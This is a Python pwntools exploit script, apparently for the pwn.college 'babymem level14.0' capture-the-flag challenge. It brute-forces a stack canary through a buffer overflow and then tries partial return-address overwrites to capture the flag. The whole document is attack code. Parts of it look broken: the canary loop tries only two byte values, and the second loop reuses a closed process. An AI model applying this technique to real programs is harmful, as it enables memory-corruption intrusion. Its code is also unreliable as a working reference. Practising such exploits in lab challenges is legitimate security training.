from pwn import *

file = "/challenge/babymem_level14.0"
canaryfound = False
canary = b'\x00'
canarypos = 424
buffer = 432
firstbyte = b'\xd9'
secondbyte = 11
byte = b'\xff'
while not canaryfound:
    for i in range(2):
        p = process(file)
        p.sendline(bytes(str(canarypos+2), 'ascii'))
        byte = i.to_bytes(1, 'big')
        p.sendline(b'REPEAT' + b'A'*(canarypos-6) + canary + byte)
        p.interactive()
        print(p.recvuntil(b'Goodbye'))
        exitcode = p.poll(block=False)
        print(exitcode)
        p.close()
        print(byte)
        print(canary + byte)
        try:
            if exitcode >= 0:
                canary = canary+byte
                break
        except:
            print(exitcode)
    if len(canary) == 8:
        canaryfound = True


for i in range(256):
    addr = firstbyte
    addr += int.to_bytes((secondbyte+((i%16)*16)), 'big')
    p.sendline(bytes(str(buffer+2), 'ascii'))
    p.send(b'A'*buffer + addr)
    try:
        p.recvuntil(b'pwn.college')
        flag = p.recvline()
    except:
        p.close()

print(b'pwn.college' + flag)
    


